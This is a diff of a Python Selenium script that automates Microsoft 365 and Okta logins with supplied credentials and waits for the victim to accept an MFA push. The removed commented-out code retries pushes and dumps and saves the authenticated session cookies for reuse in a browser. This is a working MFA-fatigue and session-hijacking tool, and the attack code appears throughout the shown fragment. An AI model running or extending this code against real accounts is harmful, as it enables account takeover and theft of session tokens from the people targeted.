@@ -40,11 +40,6 @@ from selenium.common.exceptions import TimeoutException
 from selenium.common.exceptions import NoSuchElementException
 from selenium.common.exceptions import StaleElementReferenceException
 
-#from selenium.webdriver.common.by import By
-#from selenium.webdriver.support.ui import WebDriverWait # used to check if response loading is complete
-#from selenium.webdriver.support.expected_conditions import staleness_of # used to support above page-load check
-#from selenium.webdriver.support import expected_conditions as EC
-
 # ignoring deprecated warnings for now
 # import warnings
 # warnings.filterwarnings("ignore", category=DeprecationWarning)
@@ -69,18 +64,6 @@ password_inputfield_id = "passwordInput"
 # Okta username input field
 okta_username_input_id = "okta-signin-username"
 okta_password_input_name = "password" # as there was no fixed id to be found
-
-# html element 'name' of the password field
-# passwd -> for o365 console
-# Password -> when in sts consode
-
-# -- more optional settings below. currently commented out
-# Set the HTTP proxy to be used by the Firefox profile
-#-- Note : Uncomment the following three lines if you want to use proxy (e.g. burpsuite intercept)
-# firefox_profile = webdriver.FirefoxProfile()
-# firefox_profile.set_preference("network.proxy.type", 1)
-# firefox_profile.set_preference("network.proxy.http", "192.168.1.11")
-# firefox_profile.set_preference("network.proxy.http_port", 8080)
 
 # Set up the Firefox options
 firefox_options = webdriver.FirefoxOptions()
@@ -199,72 +182,6 @@ def find_nextinputfield(driver, wait):
 			output_line = str(e)
 			print(output_line)
 			close_and_exit(driver)
-
-
-# # this function is used to identify the input name field
-# # the following funciton currently NOT used
-# def find_name_inputfield(driver, wait):
-# 	# here we try to find what the next input field might be. whether its an input name field or password
-# 	#next_input_field_xpath = "//input[contains(@name, 'name') or contains(@name, 'password') or contains(@name, 'passwd')]"
-# 	next_input_field_xpath = "//input[translate(@name, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz')='name']"
-# 	count = 1
-# 	while count <= 3:
-# 		try:
-# 			print("-- Trying to find input field that contain 'name' (e.g. username) in the input field.")
-# 			input_fields  = wait.until(
-# 				EC.presence_of_element_located((By.XPATH, next_input_field_xpath))
-# 			)
-
-# 			# Initialize the last_input_field variable to None
-# 			last_name_field = None
-
-# 			# Loop through the input fields and send keys based on their name attribute
-# 			if len(input_fields) > 0:
-# 				for input_field in input_fields:
-# 					name_attr = input_field.get_attribute("name")
-# 					if "name" in name_attr.lower():
-# 						print("(+) Sending username to an identified input field that contained text 'name'...")
-# 						input_field.send_keys(user_name)		
-# 						last_name_field = input_field				
-# 					# elif "password" in name_attr or "passwd" in name_attr:
-# 					# 	input_field.send_keys(user_password)
-# 					# 	last_input_field = input_field
-# 					# 	print("(+) Sending password to an identified input field that contained text 'password' or 'passwd' ...")
-					
-# 				# Once all input fields are filled send enter key
-# 				# Send an Enter key to the last filled input field
-# 				if last_name_field:
-# 					last_name_field.send_keys(Keys.ENTER)
-# 					return True
-# 				else:
-# 					print("No input fields with 'name' were found.")
-# 			else:
-# 				print("No input fields with 'name' in name attribute were found.")
-# 				print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
-# 				time.sleep(1)
-# 				count += 1
-# 				continue
-# 		except NoSuchElementException:
-# 			print("-- Input field with 'name' in name attribute not found. Continuing loop.")
-# 			print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
-# 			time.sleep(1)
-# 			count += 1
-# 			continue
-# 		except TimeoutException:
-# 			output_line = "-- Timeout waiting for page load or username input field to appear"
-# 			print("-- Sleeping for 10 more seconds... to see if next page loads. And trying #" + str(count))
-# 			time.sleep(10)
-# 			count += 1
-# 			continue
-# 		except Exception as e:
-# 			output_line = str(e)
-# 			print(output_line)
-# 			print("\n-- Trace error:")
-# 			traceback.print_exc()
-# 			close_and_exit(driver)
-# 	# else sending input to name field was not successful
-# 	return False
-# #^-- above function is currently not used..
 
 # Function to perform Okta auth
 def perform_okta_auth(driver, wait):
@@ -555,46 +472,6 @@ def try_userauth(driver, wait):
 			passwordInput.send_keys(user_password)
 			passwordInput.send_keys(Keys.ENTER)			
 			return True
-
-# this function is specific to OKTA MFA, there is a another mfa check function for usual o365 MFA defined  next
-# update:  we currently do not need this function as check_mfa_received() next can handle both auth types ok so far.
-# def check_okta_specific_mfa_received(driver, wait):
-# 	print("(+) Okta auth credentials seem successful. Waiting for user to accept MFA auth..")
-
-# 	# then for upto 55 seconds wait for MFA acceptance before starting the process again for a new MFA push
-# 	mfa_acceptance_received = False
-# 	mfa_maxwait_seconds = 55
-# 	for i in range(mfa_maxwait_seconds):
-# 		print(driver.current_url)
-# 		# Check if the current URL matches one of the expected URLs
-# 		if "https://login.microsoftonline.com/common/SAS/ProcessAuth" in driver.current_url or "https://login.microsoftonline.com/kmsi" in driver.current_url or "https://www.office.com/" in driver.current_url:
-# 			print("\n (+) MFA authentication successful.")
-# 			mfa_acceptance_received = True
-		
-# 			# Print the session cookie values
-# 			print("\n(+) --- Printing obtained session cookies below. Use them in your browser sesison -------\n")  
-# 			session_cookies = driver.get_cookies()
-# 			session_cookies_json = json.dumps(session_cookies)
-# 			print(session_cookies_json)
-# 			print("\n(+)----------\n")  
-
-# 			# write the session cookie to the file	
-# 			with open("captured_mfa_authed_sesisons.txt", "a") as f:
-# 				f.write('\n------ Capture session for: ' + user_name + ' -----------\n')
-# 				f.write(session_cookies_json)
-# 				f.write("\n-------End.----------------------------\n")
-			
-# 			print("(+) Captured session written to: .\captured_mfa_authed_sesisons.txt")
-# 			break
-		
-# 		# sleep one second till next loop
-# 		print(f"Countdown: {mfa_maxwait_seconds - i:02}", end="\r", flush=True)
-# 		time.sleep(1)
-	
-# 	return mfa_acceptance_received	
-
-# ^ above function is specific to OKTA MFA, there is a another mfa check function for usual o365 MFA defined  next
-# ^ update:  we currently do not need above function as check_mfa_received() below can handle both auth types ok so far.
 
 # this function below is for o365 MFA - it waits and checks if MFA has been received for the user
 def check_mfa_received(driver, wait):
